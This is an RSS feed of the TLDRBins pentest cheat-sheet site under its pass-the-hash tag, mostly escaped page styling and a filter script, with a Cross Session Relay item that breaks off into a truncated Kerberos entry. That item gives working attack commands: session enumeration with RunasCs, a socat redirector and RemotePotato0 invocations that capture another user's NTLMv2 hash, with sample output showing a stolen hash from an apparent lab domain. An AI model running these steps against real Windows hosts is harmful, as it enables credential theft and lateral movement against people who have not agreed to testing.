<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Pass-the-Hash on TLDRBins</title>
    <link>https://tldrbins.github.io/@pass-the-hash/</link>
    <description>Recent content in Pass-the-Hash on TLDRBins</description>
    <generator>Hugo</generator>
    <language>en-us</language>
    <atom:link href="https://tldrbins.github.io/@pass-the-hash/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>ADCS</title>
      <link>https://tldrbins.github.io/adcs/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/adcs/</guid>
      <description>&lt;style&gt;&#xA;:root{&#xA;   &#xA;  --line:     var(--grey-lighten-4, #e6e6e6);&#xA;  --bg:       var(--grey-lighten-5, #f7f7f7);&#xA;  --fg:       var(--grey, #666);&#xA;  --hover-bg: var(--grey-lighten-4, #ececec);&#xA;  --active-bg: white;&#xA;  --active-fg: var(--primary, #6b46c1);&#xA;&#xA;  --dm-line:   var(--darkmode-dark-grey-2, #2b2b2b);&#xA;  --dm-bg:     var(--darkmode-dark-grey-1, #1f1f1f);&#xA;  --dm-fg:     #a8a8a8;&#xA;  --dm-hover:  #ae81ff;&#xA;  --dm-active-bg: var(--darkmode-dark-grey-2, #2b2b2b);&#xA;  --dm-active-fg: #ae81ff;&#xA;}&#xA;&#xA; &#xA;.auth-wrapper {&#xA;  display: flex;&#xA;  justify-content: center;      &#xA;  width: 100%;&#xA;}&#xA;&#xA;.auth-frame {&#xA;  border: 1px solid var(--line);&#xA;  border-radius: 10px;&#xA;  overflow: hidden;&#xA;  width: 100%;&#xA;  max-width: 900px;             &#xA;  background: var(--line);&#xA;  box-sizing: border-box;&#xA;}&#xA;&#xA; &#xA;.auth-grid {&#xA;  display: grid;&#xA;  grid-template-columns: 1fr 1fr 1fr;&#xA;  grid-template-rows: auto 1fr 1fr;&#xA;  gap: 1px;                     &#xA;  background: transparent;&#xA;  width: 100%;&#xA;  height: 100%;&#xA;}&#xA;&#xA; &#xA;.cell {&#xA;  background: var(--bg);&#xA;  min-height: 50px;&#xA;  display: flex;&#xA;  align-items: center;&#xA;  justify-content: center;&#xA;  padding: 0;&#xA;  color: var(--fg);&#xA;  transition: background-color .12s ease, color .12s ease;&#xA;}&#xA;&#xA; &#xA;.title {&#xA;  grid-column: 1 / -1;&#xA;  font-weight: 700;&#xA;  font-size: 1.05rem;&#xA;  color: var(--grey-darken-2);&#xA;  background: var(--bg);&#xA;  padding: 10px;&#xA;  text-align: center;&#xA;  user-select: none;         &#xA;  pointer-events: none;      &#xA;}&#xA;&#xA; &#xA;.cell-ker {&#xA;  user-select: none;         &#xA;  pointer-events: none;      &#xA;}&#xA;&#xA; &#xA;.cell-all    { grid-row: 2 / 4; grid-column: 1; }&#xA;.cell-pw     { grid-row: 2; grid-column: 2; }&#xA;.cell-ntlm   { grid-row: 3; grid-column: 2; }&#xA;.cell-ker    { grid-row: 2; grid-column: 3; }&#xA;.cell-subs   { grid-row: 3; grid-column: 3; }&#xA;&#xA; &#xA;.btn {&#xA;  width: 100%;&#xA;  height: 100%;&#xA;  background: transparent;&#xA;  border: none;&#xA;  cursor: pointer;&#xA;  font-weight: 700;&#xA;  font-size: 0.9rem;&#xA;  color: inherit;&#xA;  text-align: center;&#xA;  padding: 12px 8px;&#xA;  box-sizing: border-box;&#xA;}&#xA;&#xA; &#xA;.auth-grid .cell:hover:not(.has-subrow) {&#xA;  background: var(--hover-bg);&#xA;  color: var(--active-fg);  &#xA;}&#xA;.auth-grid .cell:has(.btn.active):not(.has-subrow) {&#xA;  background: var(--active-bg);&#xA;  color: var(--active-fg);&#xA;}&#xA;&#xA; &#xA;.sub-row {&#xA;  display: flex;&#xA;  width: 100%;&#xA;  height: 100%;&#xA;  gap: 1px;&#xA;  box-sizing: border-box;&#xA;}&#xA;.sub-item {&#xA;  flex: 1;&#xA;  background: var(--bg);&#xA;  display: flex;&#xA;  align-items: center;&#xA;  justify-content: center;&#xA;  color: var(--fg);&#xA;  transition: background .12s ease, color .12s ease;&#xA;}&#xA;.sub-item .btn { width: 100%; height: 100%; }&#xA;&#xA;.sub-item:hover {&#xA;  background: var(--hover-bg);&#xA;  color: var(--active-fg);&#xA;}&#xA;.sub-item:has(.btn.active) {&#xA;  background: var(--active-bg);&#xA;  color: var(--active-fg);&#xA;}&#xA;&#xA; &#xA;body.dark-mode .auth-frame {&#xA;  border-color: var(--dm-line);&#xA;  background: var(--dm-line);&#xA;}&#xA;body.dark-mode .cell,&#xA;body.dark-mode .sub-item {&#xA;  background: var(--dm-bg);&#xA;  color: var(--dm-fg);&#xA;}&#xA;body.dark-mode .title {&#xA;  background: var(--dm-bg);&#xA;  color: #d5d5d5;&#xA;}&#xA;&#xA;body.dark-mode .cell:hover:not(.has-subrow) {&#xA;  background: var(--dm-hover);&#xA;  color: var(--dm-active-bg);  &#xA;}&#xA;body.dark-mode .cell:has(.btn.active):not(.has-subrow) {&#xA;  background: var(--dm-active-bg);&#xA;  color: var(--dm-active-fg);&#xA;}&#xA;body.dark-mode .sub-item:hover {&#xA;  background: var(--dm-hover);&#xA;  color: var(--dm-active-bg);&#xA;}&#xA;body.dark-mode .sub-item:has(.btn.active) {&#xA;  background: var(--dm-active-bg);&#xA;  color: var(--dm-active-fg);&#xA;}&#xA;&#xA; &#xA;.highlight.active-block pre {&#xA;  border: 1px solid var(--grey-lighten-3);&#xA;  border-radius: 0.2rem;&#xA;}&#xA;&#xA;.highlight.active-block.codeBlock pre:hover,&#xA;.highlight.active-block.codeBlock-start pre:hover,&#xA;.highlight.active-block.codeBlock-end pre:hover {&#xA;  border-color: var(--secondary);&#xA;}&#xA;&#xA;body.dark-mode .highlight.active-block pre {&#xA;  border-color: var(--grey-darken-4);&#xA;}&#xA;&#xA;body.dark-mode .highlight.active-block.codeBlock pre:hover,&#xA;body.dark-mode .highlight.active-block.codeBlock-start pre:hover,&#xA;body.dark-mode .highlight.active-block.codeBlock-end pre:hover {&#xA;  border-color: var(--grey-lighten-1);&#xA;}&#xA;&#xA; &#xA;@media (max-width: 768px) {&#xA;  .auth-grid {&#xA;    grid-template-columns: 1fr;&#xA;    grid-template-rows: auto repeat(5, auto);&#xA;  }&#xA;  .cell-all,&#xA;  .cell-pw,&#xA;  .cell-ntlm,&#xA;  .cell-ker,&#xA;  .cell-subs {&#xA;    grid-row: auto;&#xA;    grid-column: 1;&#xA;  }&#xA;  .sub-row { flex-direction: column; }&#xA;}&#xA;&lt;/style&gt;&#xA;&#xA;&lt;script&gt;&#xA;document.addEventListener(&#34;DOMContentLoaded&#34;, () =&gt; {&#xA;  const buttons = document.querySelectorAll(&#34;.auth-grid .btn&#34;);&#xA;  const filters = [&#34;password&#34;, &#34;ntlm&#34;, &#34;password-based-kerberos&#34;, &#34;ntlm-based-kerberos&#34;, &#34;ticket-based-kerberos&#34;];&#xA;&#xA;  const filterMap = {&#xA;    password: [&#34;password&#34;],&#xA;    ntlm: [&#34;ntlm&#34;],&#xA;    &#34;kerberos-password&#34;: [&#34;password-based-kerberos&#34;],&#xA;    &#34;kerberos-ntlm&#34;: [&#34;ntlm-based-kerberos&#34;],&#xA;    &#34;kerberos-ticket&#34;: [&#34;ticket-based-kerberos&#34;],&#xA;    all: filters,&#xA;  };&#xA;&#xA;  function filterBlocks(filter) {&#xA;    const targetClasses = filterMap[filter] || [];&#xA;    const authClasses = [&#xA;      &#34;password&#34;,&#xA;      &#34;ntlm&#34;,&#xA;      &#34;password-based-kerberos&#34;,&#xA;      &#34;ntlm-based-kerberos&#34;,&#xA;      &#34;ticket-based-kerberos&#34;,&#xA;    ];&#xA;    const blocks = [...document.querySelectorAll(&#34;.highlight&#34;)];&#xA;    const groups = [];&#xA;    let current = [];&#xA;&#xA;    &#xA;    blocks.forEach(block =&gt; {&#xA;      current.push(block);&#xA;      const isEnd = block.classList.contains(&#34;codeBlock-end&#34;);&#xA;      const isStandalone = block.classList.contains(&#34;codeBlock-start&#34;) &amp;&amp; block.classList.contains(&#34;codeBlock-end&#34;);&#xA;      if (isEnd || isStandalone) {&#xA;        groups.push(current);&#xA;        current = [];&#xA;      }&#xA;    });&#xA;    if (current.length) groups.push(current);&#xA;&#xA;    &#xA;    groups.forEach(group =&gt; {&#xA;      const authBlocks = group.filter(b =&gt; authClasses.some(c =&gt; b.classList.contains(c)));&#xA;      if (!authBlocks.length) return; &#xA;&#xA;      &#xA;      if (filter === &#34;all&#34;) {&#xA;        authBlocks.forEach(b =&gt; {&#xA;          b.style.display = &#34;block&#34;;&#xA;          b.classList.remove(&#34;active-block&#34;);&#xA;        });&#xA;        return;&#xA;      }&#xA;&#xA;      &#xA;      const matched = authBlocks.filter(b =&gt;&#xA;        targetClasses.some(tc =&gt; b.classList.contains(tc))&#xA;      );&#xA;&#xA;      if (matched.length &gt; 0) {&#xA;        &#xA;        authBlocks.forEach(b =&gt; {&#xA;          const visible = matched.includes(b);&#xA;          b.style.display = visible ? &#34;block&#34; : &#34;none&#34;;&#xA;          b.classList.toggle(&#34;active-block&#34;, visible);&#xA;        });&#xA;        return;&#xA;      }&#xA;&#xA;      &#xA;      let fallback = authBlocks.filter(b =&gt; b.classList.contains(&#34;password&#34;));&#xA;      if (fallback.length === 0) {&#xA;        fallback = authBlocks.filter(b =&gt; b.classList.contains(&#34;ntlm&#34;));&#xA;      }&#xA;&#xA;      &#xA;      authBlocks.forEach(b =&gt; {&#xA;        const visible = fallback.includes(b);&#xA;        b.style.display = visible ? &#34;block&#34; : &#34;none&#34;;&#xA;        b.classList.toggle(&#34;active-block&#34;, visible);&#xA;      });&#xA;    });&#xA;  }&#xA;&#xA;  function setActiveButton(btn) {&#xA;    buttons.forEach(b =&gt; b.classList.remove(&#34;active&#34;));&#xA;    btn.classList.add(&#34;active&#34;);&#xA;    const filter = btn.dataset.filter;&#xA;    localStorage.setItem(&#34;authFilter&#34;, filter);&#xA;    filterBlocks(filter);&#xA;  }&#xA;&#xA;  const saved = localStorage.getItem(&#34;authFilter&#34;);&#xA;  const initial = saved &amp;&amp; filterMap[saved] ? saved : &#34;all&#34;;&#xA;  const initBtn = [...buttons].find(b =&gt; b.dataset.filter === initial);&#xA;  initBtn ? setActiveButton(initBtn) : filterBlocks(&#34;all&#34;);&#xA;&#xA;  buttons.forEach(btn =&gt; btn.addEventListener(&#34;click&#34;, () =&gt; setActiveButton(btn)));&#xA;});&#xA;&lt;/script&gt;&#xA;&#xA;&lt;br&gt;&#xA;&#xA;&#xA;&lt;div class=&#34;auth-wrapper&#34;&gt;&#xA;  &lt;div class=&#34;auth-frame&#34;&gt;&#xA;    &lt;div class=&#34;auth-grid&#34;&gt;&#xA;      &lt;div class=&#34;cell title&#34;&gt;Authentication Method&lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-all&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;all&#34;&gt;ALL&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-pw&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;password&#34;&gt;PASSWORD&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-ntlm&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;ntlm&#34;&gt;NTLM&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-ker&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;kerberos&#34;&gt;KERBEROS&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-subs has-subrow&#34;&gt;&#xA;        &lt;div class=&#34;sub-row&#34;&gt;&#xA;          &lt;div class=&#34;sub-item&#34;&gt;&lt;button class=&#34;btn&#34; data-filter=&#34;kerberos-password&#34;&gt;PASSWORD&lt;/button&gt;&lt;/div&gt;&#xA;          &lt;div class=&#34;sub-item&#34;&gt;&lt;button class=&#34;btn&#34; data-filter=&#34;kerberos-ntlm&#34;&gt;NTLM&lt;/button&gt;&lt;/div&gt;&#xA;          &lt;div class=&#34;sub-item&#34;&gt;&lt;button class=&#34;btn active&#34; data-filter=&#34;kerberos-ticket&#34;&gt;TICKET&lt;/button&gt;&lt;/div&gt;&#xA;        &lt;/div&gt;&#xA;      &lt;/div&gt;&#xA;    &lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&#xA;&lt;h3 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h3&gt;&#xA;&lt;p&gt;&#xA;&lt;button data-tabset=&#34;set1&#34; data-tabcontent=&#34;tab1&#34; &gt;Linux&lt;/button&gt;&#xA;&#xA;&lt;button data-tabset=&#34;set1&#34; data-tabcontent=&#34;tab2&#34; &gt;Windows&lt;/button&gt;&#xA;&#xA;&lt;div class=&#34;tabcontent&#34; data-tabset=&#34;set1&#34; data-tabcontent=&#34;tab1&#34;&gt;&lt;p&gt;&lt;button data-tabset=&#34;set1-1&#34; data-tabcontent=&#34;tab1&#34; class=&#34;active&#34;&gt;certipy-ad&lt;/button&gt;&#xA;&lt;button data-tabset=&#34;set1-1&#34; data-tabcontent=&#34;tab2&#34; &gt;nxc&lt;/button&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Cross Session Relay</title>
      <link>https://tldrbins.github.io/cross_session_relay/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/cross_session_relay/</guid>
      <description>&lt;h3 id=&#34;display-information-about-the-session-host&#34;&gt;Display Information about the Session Host&lt;/h3&gt;&#xA;&lt;p&gt;&#xA;&lt;button data-tabset=&#34;set1&#34; data-tabcontent=&#34;tab1&#34; &gt;Windows&lt;/button&gt;&#xA;&#xA;&lt;div class=&#34;tabcontent&#34; data-tabset=&#34;set1&#34; data-tabcontent=&#34;tab1&#34;&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;qwinsta *&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Or runas&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;.\RunasCs.exe x x qwinsta -l 9&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;*Evil-WinRM* PS C:\Users\winrm_svc\Documents&amp;gt; .\RunasCs.exe x x qwinsta -l 9&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt; SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;&amp;gt;&lt;/span&gt;services                                    &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Disc&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt; console           tbrady                    1  Active&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;h3 id=&#34;abuse-1-capture-ntlm-hash&#34;&gt;Abuse #1: Capture NTLM Hash&lt;/h3&gt;&#xA;&lt;p&gt;&#xA;&lt;button data-tabset=&#34;set2&#34; data-tabcontent=&#34;tab1&#34; &gt;RemotePotato0&lt;/button&gt;&#xA;&#xA;&lt;button data-tabset=&#34;set2&#34; data-tabcontent=&#34;tab2&#34; &gt;KrbRelay&lt;/button&gt;&#xA;&#xA;&lt;div class=&#34;tabcontent&#34; data-tabset=&#34;set2&#34; data-tabcontent=&#34;tab1&#34;&gt;&lt;h4 id=&#34;1-redirect-auth-request-back-to-target&#34;&gt;1. Redirect Auth Request Back to Target&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; In &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; Linux &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:&amp;lt;TARGET&amp;gt;:&amp;lt;RELAY_PORT&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;2-trigger-auth-request&#34;&gt;2. Trigger Auth Request&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;.\RemotePotato0.exe -m 2 -s &amp;lt;TARGET_SESSION_ID&amp;gt; -x &amp;lt;LOCAL_IP&amp;gt; -p &amp;lt;RELAY_PORT&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;*Evil-WinRM* PS C:\Users\winrm_svc\Documents&amp;gt; .\RemotePotato0.exe -m 2 -s 1 -x 10.10.14.31 -p 9999&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 9999&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Example Network redirector:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;        sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:9999&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Starting the RPC server to capture the credentials hash from the user authentication!!&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Spawning COM object in the session: 1&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] RPC relay server listening on port 9997 ...&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Starting RogueOxidResolver RPC Server listening on port 9999 ...&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] IStoragetrigger written: 104 bytes&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] ServerAlive2 RPC Call&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] ResolveOxid2 RPC call&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[+] Received the relayed authentication on the RPC relay server on port 9997&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Connected to RPC Server 127.0.0.1 on port 9999&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[+] User hash stolen!&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;NTLMv2 Client   : DC01&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;NTLMv2 Username : rebound\tbrady&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;NTLMv2 Hash     : tbrady::rebound:c85c8b06ea8cbf94:f0903535db0e745638f0a22546baca39:010100000000000078e462474f0ddb01bb8e369fa1e4686d0000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e006800740062000700080078e462474f0ddb0106000400060000000800300030000000000000000100000000200000222be9703dcb830eda784e33f597391b2c7cf7f0fb411ed5f2648c010cc425380a00100000000000000000000000000000000000090000000000000000000000&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;small&gt;&lt;em&gt;Ref: &lt;a href=&#34;https://github.com/antonioCoco/RemotePotato0&#34;&gt;RemotePotato0&lt;/a&gt;&lt;/em&gt;&lt;/small&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Kerberos</title>
      <link>https://tldrbins.github.io/kerberos/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/kerberos/</guid>
      <description>&lt;style&gt;&#xA;:root{&#xA;   &#xA;  --line:     var(--grey-lighten-4, #e6e6e6);&#xA;  --bg:       var(--grey-lighten-5, #f7f7f7);&#xA;  --fg:       var(--grey, #666);&#xA;  --hover-bg: var(--grey-lighten-4, #ececec);&#xA;  --active-bg: white;&#xA;  --active-fg: var(--primary, #6b46c1);&#xA;&#xA;  --dm-line:   var(--darkmode-dark-grey-2, #2b2b2b);&#xA;  --dm-bg:     var(--darkmode-dark-grey-1, #1f1f1f);&#xA;  --dm-fg:     #a8a8a8;&#xA;  --dm-hover:  #ae81ff;&#xA;  --dm-active-bg: var(--darkmode-dark-grey-2, #2b2b2b);&#xA;  --dm-active-fg: #ae81ff;&#xA;}&#xA;&#xA; &#xA;.auth-wrapper {&#xA;  display: flex;&#xA;  justify-content: center;      &#xA;  width: 100%;&#xA;}&#xA;&#xA;.auth-frame {&#xA;  border: 1px solid var(--line);&#xA;  border-radius: 10px;&#xA;  overflow: hidden;&#xA;  width: 100%;&#xA;  max-width: 900px;             &#xA;  background: var(--line);&#xA;  box-sizing: border-box;&#xA;}&#xA;&#xA; &#xA;.auth-grid {&#xA;  display: grid;&#xA;  grid-template-columns: 1fr 1fr 1fr;&#xA;  grid-template-rows: auto 1fr 1fr;&#xA;  gap: 1px;                     &#xA;  background: transparent;&#xA;  width: 100%;&#xA;  height: 100%;&#xA;}&#xA;&#xA; &#xA;.cell {&#xA;  background: var(--bg);&#xA;  min-height: 50px;&#xA;  display: flex;&#xA;  align-items: center;&#xA;  justify-content: center;&#xA;  padding: 0;&#xA;  color: var(--fg);&#xA;  transition: background-color .12s ease, color .12s ease;&#xA;}&#xA;&#xA; &#xA;.title {&#xA;  grid-column: 1 / -1;&#xA;  font-weight: 700;&#xA;  font-size: 1.05rem;&#xA;  color: var(--grey-darken-2);&#xA;  background: var(--bg);&#xA;  padding: 10px;&#xA;  text-align: center;&#xA;  user-select: none;         &#xA;  pointer-events: none;      &#xA;}&#xA;&#xA; &#xA;.cell-ker {&#xA;  user-select: none;         &#xA;  pointer-events: none;      &#xA;}&#xA;&#xA; &#xA;.cell-all    { grid-row: 2 / 4; grid-column: 1; }&#xA;.cell-pw     { grid-row: 2; grid-column: 2; }&#xA;.cell-ntlm   { grid-row: 3; grid-column: 2; }&#xA;.cell-ker    { grid-row: 2; grid-column: 3; }&#xA;.cell-subs   { grid-row: 3; grid-column: 3; }&#xA;&#xA; &#xA;.btn {&#xA;  width: 100%;&#xA;  height: 100%;&#xA;  background: transparent;&#xA;  border: none;&#xA;  cursor: pointer;&#xA;  font-weight: 700;&#xA;  font-size: 0.9rem;&#xA;  color: inherit;&#xA;  text-align: center;&#xA;  padding: 12px 8px;&#xA;  box-sizing: border-box;&#xA;}&#xA;&#xA; &#xA;.auth-grid .cell:hover:not(.has-subrow) {&#xA;  background: var(--hover-bg);&#xA;  color: var(--active-fg);  &#xA;}&#xA;.auth-grid .cell:has(.btn.active):not(.has-subrow) {&#xA;  background: var(--active-bg);&#xA;  color: var(--active-fg);&#xA;}&#xA;&#xA; &#xA;.sub-row {&#xA;  display: flex;&#xA;  width: 100%;&#xA;  height: 100%;&#xA;  gap: 1px;&#xA;  box-sizing: border-box;&#xA;}&#xA;.sub-item {&#xA;  flex: 1;&#xA;  background: var(--bg);&#xA;  display: flex;&#xA;  align-items: center;&#xA;  justify-content: center;&#xA;  color: var(--fg);&#xA;  transition: background .12s ease, color .12s ease;&#xA;}&#xA;.sub-item .btn { width: 100%; height: 100%; }&#xA;&#xA;.sub-item:hover {&#xA;  background: var(--hover-bg);&#xA;  color: var(--active-fg);&#xA;}&#xA;.sub-item:has(.btn.active) {&#xA;  background: var(--active-bg);&#xA;  color: var(--active-fg);&#xA;}&#xA;&#xA; &#xA;body.dark-mode .auth-frame {&#xA;  border-color: var(--dm-line);&#xA;  background: var(--dm-line);&#xA;}&#xA;body.dark-mode .cell,&#xA;body.dark-mode .sub-item {&#xA;  background: 